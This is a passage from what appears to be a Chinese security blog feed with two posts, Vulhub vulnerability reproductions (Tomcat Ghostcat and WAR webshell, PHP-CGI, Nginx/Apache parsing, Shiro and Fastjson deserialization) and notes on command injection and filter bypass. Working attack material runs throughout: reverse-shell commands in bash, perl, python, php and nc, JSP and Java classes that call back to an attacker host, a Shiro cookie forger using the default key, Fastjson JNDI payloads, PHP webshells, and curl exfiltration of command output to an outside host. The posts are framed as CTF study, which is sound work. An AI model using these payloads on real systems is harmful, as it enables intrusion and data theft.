class="line">%&gt;</span><br></pre></td></tr></table></figure><p>使用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http:&#x2F;&#x2F;vpsip&#x2F; 8009 &#x2F;WEB-INF&#x2F;exp.jsp eval</span><br></pre></td></tr></table></figure><p><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/10.PNG" alt><br>尝试了下弹shell的命令失败了。但是问题找不出来。最好在比赛中不要花时间执着于弹shell。可能会有大问题。</p><p>补：经郁师傅指点明白了是jsp的问题。具体原因之后解释，简要说主要是java弹shell时使用字符串与字符串数组的区别。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="built_in">String</span>[] cmdstr = &#123; <span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="string">"bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1"</span> &#125;;</span><br><span class="line">    Runtime.getRuntime().exec(cmdstr);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>这样就能弹shell了。</p><h2 id="tomcat7-弱口令-amp-amp-后台getshell漏洞"><a href="#tomcat7-弱口令-amp-amp-后台getshell漏洞" class="headerlink" title="tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞"></a>tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞</h2><p>因为WUST那道题过来复现了下。还惊人的重现了：重复使用一个一次性的cookie也会造成403的问题。看来题目果然源于生活。</p><p>步骤很简单。第一步tomcat弱口令登入<code>manager/html</code>后台<br>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。<br>由于后台支持部署war文件，直接上传war即可getshell<br>步骤:<br>1.cmd.jsp</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                 </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><code>jar cvf webshell.war webshell.jsp</code><br>生成webshell<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/10.5.PNG" alt><br>2.命令执行<br><code>/webshell/exp.jsp?pwd=023&amp;i=id)</code><br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/11.PNG" alt></p><h1 id="PHP-CGI远程代码执行漏洞（CVE-2012-1823）"><a href="#PHP-CGI远程代码执行漏洞（CVE-2012-1823）" class="headerlink" title="PHP-CGI远程代码执行漏洞（CVE-2012-1823）"></a>PHP-CGI远程代码执行漏洞（CVE-2012-1823）</h1><p>出现在以cgi模式运行的php中，影响版本 php &lt; 5.3.12 or php &lt; 5.4.2<br>简单说就是命令行的参数可以通过querysring的形式传入。<br>比如直接传-s<br><code>index.php?-s</code><br>直接回显源码。<br>进一步利用这点，则通过-d使用<code>php://input</code>达成文件包含=&gt;命令执行。<br>payload<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/12.PNG" alt></p><p><code>POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data: &lt;?php echo &#96;ls&#96;; ?&gt;</span><br></pre></td></tr></table></figure><h1 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h1><h2 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h2><p>Apache HTTPD 支持一个文件拥有多个后缀<br>假如配置如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure><p>那么在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件<br>所以可以使用上传时加后缀绕过</p><p>访问上传1.php.jpg即可发现其被解析为php<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/13.PNG" alt></p><h2 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h2><p>之前接触过的shtml 的命令执行<br><code>&lt;!--#exec cmd=&quot;ls&quot; --&gt;</code></p><p>之前HITCON2018 WhySoSerial中也有用到它进行文件包含的利用,这也是shtml的Server-Side Includes即ssi的特性了。</p><h2 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><p>环境有问题…没法复现了<br>大概就是上传php被ban时,通过.php%0a绕过，但是访问文件时时仍能被解析成php</p><h1 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h1><h2 id="Nginx-解析漏洞复现"><a href="#Nginx-解析漏洞复现" class="headerlink" title="Nginx 解析漏洞复现"></a>Nginx 解析漏洞复现</h2><p>这个洞直接帮我解决某入群题困扰了好久的一个点。也解决了我原来在做有关nginx有关服务的题目时遇到的奇特现象。<br>该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞</p><p>进入环境。直接上传一个<code>GIF89A&lt;?php @eval($_POST[0]);?&gt;</code>的1.jpg<br>绕过检测，上传图片。</p><p>同时访问图片。<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/14.PNG" alt></p><p>但是一旦在jpg后加上<code>/.php</code>这个马就将被作为php解析<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/15.PNG" alt><br>成功getshell</p><p>因此可以用在某些特殊的上传题目中。得到webshell竟可以如此简单,也算是一个小技巧了。</p><p>至于原因的话,还是由于nginx的配置问题。<br>一旦配置成把以.php结尾的文件交给fastcgi处理,遇到我们的/.php就直接扔给php了。<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/16.PNG" alt></p><p>且php.ini设置了cgi.fix_pathinfo=1时,fastcgi会自动找到上级的1.jpg处理。<br>最重要的一点是php-fpm.conf中的security.limit_extensions配置项限制了fastcgi解析文件的类型<br>这项为空时就会将jpg文件当做代码解析。</p><p>所以只要</p><blockquote><p>1、 将php.ini文件中的cgi.fix_pathinfo的值设置为0,这样php再解析1.php/1.jpg这样的目录时,只要1.jpg不存在就会显示404页面<br>  2、 php-fpm.conf中的security.limit_extensions后面的值设置为.php </p></blockquote><p>就可以防止错误解析。</p><h2 id="Nginx-文件名逻辑漏洞（CVE-2013-4547）"><a href="#Nginx-文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="Nginx 文件名逻辑漏洞（CVE-2013-4547）"></a>Nginx 文件名逻辑漏洞（CVE-2013-4547）</h2><p>这个跟上面的挺像的，<br>非法字符空格和截止符（\0）会导致Nginx解析URI时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。<br><code>http://127.0.0.1/file.aaa \0.php</code><br>不用说也知道webshell姿势+1</p><p>还有几个配置漏洞就不复现了hhh</p><h1 id="Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）"><a href="#Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）" class="headerlink" title="Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）"></a>Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</h1><p>严格来说自己并没有用vulhub的镜像完成复现.所以自己找了网上其他的复现文章，用了下medicean/vulapps:s_shiro_1这个镜像,姑且是能做了</p><p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p><p>首先就要准备的是java反序列化的工具ysoserial.自己之前还只用过ysoserial.net。没用过本尊这个java反序列化神器。可以直接去github项目上找已经编译好的jar.或者git clone源码用mvn编译。暂且不提。</p><p>然后首先需要构造gadget.我的目的是反弹shell.所以要把反弹shell的代码准备下(注意。java反序列触发反弹shell一定不能直接传命令的字符串，之前ghostcat里也提过了,必须要字符串数组,否则<code>&gt;</code>这样的字符过不去)而此处我们选择base64 加工命令执行代码解决这个问题<br>可以用下面这个网站直接得到编码payload<br><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a><br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/17.PNG" alt><br>运行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 <span class="string">'BASE64_ENCODED_COMMAND'</span></span><br></pre></td></tr></table></figure><p>这样就起了一个JRMP服务监听6666端口。它会接受被攻击的服务器<br>信息并反序列化，执行gadget对应的命令</p><p>接下来就是构造序列化的cookie rememberMe了。首先在登录界面勾选rememberme并抓包，准备替换cookie为我们的利用cookie</p><p>利用下面这个脚本生成cookie，参数传<code>攻击ip：java监听端口</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span>, <span class="string">'JRMPClient'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])   </span><br><span class="line"><span class="keyword">print</span> <span class="string">"rememberMe=&#123;0&#125;"</span>.format(payload.decode())</span><br></pre></td></tr></table></figure><p>本质上是利用了shiro默认密钥进行AES加密。所以可见硬编码带来的危害，导致cookie可控即可触发反序列化。<br>生成的cookie替换即可触发反序列化<br>nc监听端口得到反弹shell<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/18.PNG" alt><br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/19.PNG" alt></p><p>vulhub的环境不知道为什么弹不到shell,而它给出的方法gadget也完全不一样,不过思路大同小异。就是我的eclipse加载项目半天没搞好…</p><h2 id="fastjson-1-2-24-反序列化导致任意命令执行漏洞"><a href="#fastjson-1-2-24-反序列化导致任意命令执行漏洞" class="headerlink" title="fastjson 1.2.24 反序列化导致任意命令执行漏洞"></a>fastjson 1.2.24 反序列化导致任意命令执行漏洞</h2><p>最近莫名感觉java的题多起来了，在观摩其他dalao们的blog时也发现不少内容都在深度研究java的相关漏洞。所以自己也来尝试多复现几个反序列化的洞。至少先当个脚本小子,等到暑假就能好好研究了。</p><p>首先是1.2.24的fastjson.这里主要是一个jndi注入。其利用流程如下：<br>首先准备好利用的源码exp.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123; <span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="string">"bash -i &gt;&amp; /dev/tcp/xxxxxx/9001 0&gt;&amp;1"</span> &#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后<code>javac exp.java</code>编译好得到exp.class。</p><p>而服务端在<code>Content-Type:application/json</code>下,post json数据</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://xxx:9999/exp"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用到了marshalsec这个工具。基本上跟ysoserial用起来一样的。拷贝源码maven编译就好<br>接下来启动一个RMI服务器，监听9999端口，并制定加载远程类exp.class</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;xxx&#x2F;#exp&quot; 9999</span><br></pre></td></tr></table></figure><p>安全起见,最好还是新建一个文件夹放class文件并用python监听80端口.</p><p>本机监听9001端口收到shell.<br><img src="/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/20.PNG" alt></p><p>本质上就是,JdbcRowSetImpl这个类的dataSourceName支持传入一个rmi的源.<br>当解析这个uri的时候，就会支持rmi远程调用，去指定的rmi地址中去调用方法。<br>当远程rmi服务找不到对应方法时，可以指定一个远程class让请求方去调用，从而去获取我们恶意构造的class文件，从而RCE。</p><p>起一个ldap服务也是一样的,而且ldap似乎比rmi适用性更广。<br>只要改成<code>java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer</code>并把payload中的<code>rmi://</code>换成<code>ldap://</code>即可。</p><p>注意下这两个服务利用版本</p><ul><li>基于rmi的利用方式：适用jdk版本：JDK 6u132, JDK 7u122, JDK 8u113之前。</li><li>基于ldap的利用方式：适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。</li></ul><h2 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h2><p>跟上面没啥大区别。环境是<code>openjdk:8u102</code>。同样可以加载rmi</p><p>实际上是因为最早的fastjson反序列化也就是上面那个,是支持反序列化任意类的。只要有<code>@type</code>就能做到。而后面的版本主要是禁止了反序列化任意类的操作,并且对可以利用的类加入黑名单而已。<br><a href="https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/" target="_blank" rel="noopener">Fastjson反序列化漏洞 1.2.24-1.2.48</a></p><p>而这个版本1.2.47的payload则无需开启autotype通杀</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://xxxx:9999/Exploit"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后跟上面流程一样的直接打,拿到shell.</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记-命令执行及花式bypass写shell</title>
      <link href="2020/03/02/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8A%E8%8A%B1%E5%BC%8Fbypass%E5%86%99shell/"/>
      <url>2020/03/02/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8A%E8%8A%B1%E5%BC%8Fbypass%E5%86%99shell/</url>
      
        <content type="html"><![CDATA[<p>  命令执行的坑其实早就想填了。最早是因为校赛时，easyphp一题自己因为不熟悉命令执行的一些特性导致套娃题绕到最后一层却没拿到flag。当时十分不爽，下定决心要好好了解下命令执行的相关知识点。</p><p>关于命令执行我大体上归为php绕过+rce两类。php的难点主要是在绕过写shell上，而linux的知识主要在RCE达成上。</p><p>先从简单说起：</p><a id="more"></a><h1 id="linux-命令-amp-RCE"><a href="#linux-命令-amp-RCE" class="headerlink" title="linux 命令&amp; RCE"></a>linux 命令&amp; RCE</h1><p>rce,即remote command/code execute。通常都是渗透中希望能够利用的漏洞之一。因为我们可以以此进行命令执行，读取我们想要的文件或者反弹shell。</p><h2 id="命令及关键字waf"><a href="#命令及关键字waf" class="headerlink" title="命令及关键字waf"></a>命令及关键字waf</h2><p>简单的命令执行如DVWA靶场里的command injection 模块。它给了我们一个输入框，而它会将输入框的内容当做命令执行。<br>这样一来我们就可以用命令拼接来执行其他命令。<br>1.使用<code>&amp;&amp; &amp; ;</code>直接多语句执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;ls</span><br><span class="line">127.0.0.1&amp;ls</span><br><span class="line">127.0.0.1; ls</span><br></pre></td></tr></table></figure><p>2.高级一(亿)点的，使用管道符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1| ls</span><br></pre></td></tr></table></figure><p>管道符的妙用不止这么一点了。比如CTF或实战渗透中都可能用到的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'Y2F0Cg=='</span> | base64 -d</span><br></pre></td></tr></table></figure><p>只要用管道符可以bypass掉绝大部分关键字的waf。<br>实际利用之读flag.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span>  Y2F0IGZsYWcucGhw|base64 -d|bash</span><br></pre></td></tr></table></figure><p>bash如果没有可以用sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span>  Y2F0IGZsYWcucGhw|base64 -d|sh</span><br></pre></td></tr></table></figure><p>同时应对关键字waf，linux的特性还允许我们花式绕过<br>对空格</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IFS</span></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span></span><br><span class="line"><span class="variable">$IFS</span><span class="variable">$1</span> //<span class="variable">$1</span>改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09</span><br></pre></td></tr></table></figure><p>对关键字，如flag，cat，包括上面管道符在内也有很多方法。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat fl*  linux中*通配符匹配任意字数</span><br><span class="line"><span class="built_in">echo</span> xxxxxxx| base64 -d </span><br><span class="line">ca\t fla\g</span><br><span class="line">cat fl<span class="string">''</span>ag</span><br><span class="line">a=f;b=lag;cat <span class="variable">$a</span><span class="variable">$b</span></span><br></pre></td></tr></table></figure><p>对命令函数cat的waf,寻找替代也是一种方法，毕竟读取文件函数很多。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">head  读头几行</span><br><span class="line">tail    读尾几行</span><br><span class="line">tac     按行倒着读</span><br><span class="line">more   </span><br><span class="line">less</span><br><span class="line">nl</span><br><span class="line">sort</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>如果要奇淫技巧，可以使用如<code>cat `ls`</code><br>反引号在linux中作为内联执行。将直接输出结果。所以假如我们就在flag的目录下，这是完全可以直接耍的。</p><p>以上都是直接在webshell执行读取文件的基础上的。实际上有时候我们在实际渗透中需要的是反弹shell。包括有的题目也是需要shell来找flag的。<br><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br>这个网站总结了常见的反弹shell的方式。实际上总结下常见的几种反弹shell<br>1.bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span></span><br></pre></td></tr></table></figure><p>bash式的用到的非常多。然而还是会出现有的容器因为是docker起的而没有bash指令的问题，这种时候通常用sh替代。但是sh并不能反弹shell。所以这就涉及到其他的几种方法。</p><p>2.perl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure><p>3.python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure><p>选择python是个不错的替代方式，因为大部分linux机子上都装好了python。(比如题目环境是flask起的时候，肯定是有python了)<br>4.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><p>php同理。<br>5.netcat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br></pre></td></tr></table></figure><p>原来看到文章说，所有linux机子都预装好了nc。我觉得是很棒的。不过自己尝试过nc反弹的shell交互性稍微差了一点点。</p><p>如果遇到waf，可以用上面普通命令一样的bypass方法解决。<br>或者我们可以如此，使用<code>curl wget</code>等等直接访问我们vps上的提前写好的反弹shell文件。</p><p>之于更深一步的命令执行暂且不谈。在渗透中自然会用到的。</p><h2 id="bypass长度限制"><a href="#bypass长度限制" class="headerlink" title="bypass长度限制"></a>bypass长度限制</h2><p>HITCON2017的baby-first-revenge的例子可以说是老例子了。它的bypass长度可以达到5个<br>具体trick是以下这些：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -t 可以按时间顺序列出所有文件</span><br><span class="line">linux 可以用\进行命令的换行</span><br><span class="line">换行不影响命令执行</span><br><span class="line">sh _只要四个字符就可以执行命令</span><br></pre></td></tr></table></figure><p>然而因为这个解决方案太过高级，导致大家都会了后就不会再有人出这方面的题目考察了……</p><h2 id="盲打-RCE-amp-timebased-RCE"><a href="#盲打-RCE-amp-timebased-RCE" class="headerlink" title="盲打 RCE &amp; timebased RCE"></a>盲打 RCE &amp; timebased RCE</h2><p>time-based RCE是一个常常作为拔高水平的命令执行考点。具体常见于一下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = $_GET[`cmd`];</span><br><span class="line">`$cmd`;</span><br></pre></td></tr></table></figure><p>当我们的命令执行没有回显怎么办？常见办法之一当然是利用curl,或者wget把结果打到vps上。有点xxe盲打的味道。只不过并不需要提前放好文件，只要vps监听即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.b182oj.ceye.io/`ls`</span><br></pre></td></tr></table></figure><p>当然get请求的弊端之一是我们只能打出结果的一行结果，这当然是不行的<br>但是我们可以轻松利用sed命令解决问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p`</span><br><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 2p`</span><br><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 3p`</span><br></pre></td></tr></table></figure><p>将分别打出每一行的信息。<br>进一步还可以打出任意行任意字段内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 1`  截取第一个字</span><br><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 1-3` 截取第1~3个字</span><br><span class="line">curl http://ip.port.b182oj.ceye.io/`ls | sed -n 1p | cut -c 2-5` 截取第2~5个</span><br></pre></td></tr></table></figure><p>在此基础上也诞生了time-based RCE。原理就如上面一样。因为已经没有回显了，我们在浏览器页面就可以直接构造rce</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [$(whoami|base32|cut –c 1)=O];<span class="keyword">then</span> sleep 10;<span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>类似sql时间盲注的原理。其中<code>[ 